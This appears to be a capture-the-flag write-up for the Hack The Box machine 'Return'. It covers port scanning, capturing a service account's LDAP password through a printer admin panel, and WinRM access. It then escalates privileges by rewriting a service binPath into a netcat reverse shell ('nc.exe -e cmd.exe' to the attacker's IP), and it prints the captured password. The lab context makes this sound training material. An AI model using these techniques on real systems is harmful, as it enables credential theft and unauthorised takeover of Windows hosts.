# Enumeration

## Nmap

```
# Nmap 7.99 scan initiated Mon Jul  6 01:26:29 2026 as: /usr/lib/nmap/nmap -sC -sV --reason -oA return 10.129.95.241
Nmap scan report for 10.129.95.241
Host is up, received echo-reply ttl 127 (0.085s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-06 05:46:07Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-06T05:46:18
|_  start_date: N/A
|_clock-skew: 18m34s
| smb2-security-mode: 
```

Port 80 is running `HTB Printer Admin Panel`

## Website

![[Pasted image 20260706120223.png]]

`Home` leads to `index.php`
`Settings` leads to `settings.php`
`Fax` and `Troubleshooting` do not lead to anything

![[Pasted image 20260706120304.png]]

I put my tun0 IP address in `Server Address` field and opened a netcat listener at port 389, and the machine sent me a LDAP bind request along with the password of `svc-printer`

```
┌──(kali㉿kali)-[~/htb/return/bloodhound]
└─$ nc -lvnp 389                                              
listening on [any] 389 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.95.241] 65096
0*`%return\svc-printer�
                       1edFg43012!!
```

The password is `1edFg43012!!`

# Foothold

## WinRM

```
nxc winrm printer.return.local -u 'svc-printer' -p '1edFg43012!!'
```

This shows that we can authenticate with winrm

```
evil-winrm -i printer.return.local -u 'svc-printer' -p '1edFg43012!!'
```

The user flag is found in `C:\Users\svc-printer\Desktop`

# Privilege Escalation

If we run `net user svc-printer`, we find that we are part of a group called `Server Operators`

```
NOTE:This group only exists on domain controllers. Members can modify services, access SMB shares, and backup files on domain controllers. By default, this group has no members.
```

https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

Found this article when searched for `Server Operators Windows Privilege Escalation`

Here are the steps for the privilege Escalation

```
upload /usr/share/windows-binaries/nc.exe
```

This uploads the netcat exe from linux machine to windows box

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.42 4444"
```

This tells Service Control Manager Configuration Tool (`sc.exe`) to write the config `C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.42 4444` to VMTools

Then we run `nc -lvnp 4444` on local machine and then start sc.exe with `sc.exe start VMTools`

We get a shell as `nt authority/system` and the flag is found in `C:\Users\Administrators\Desktop`

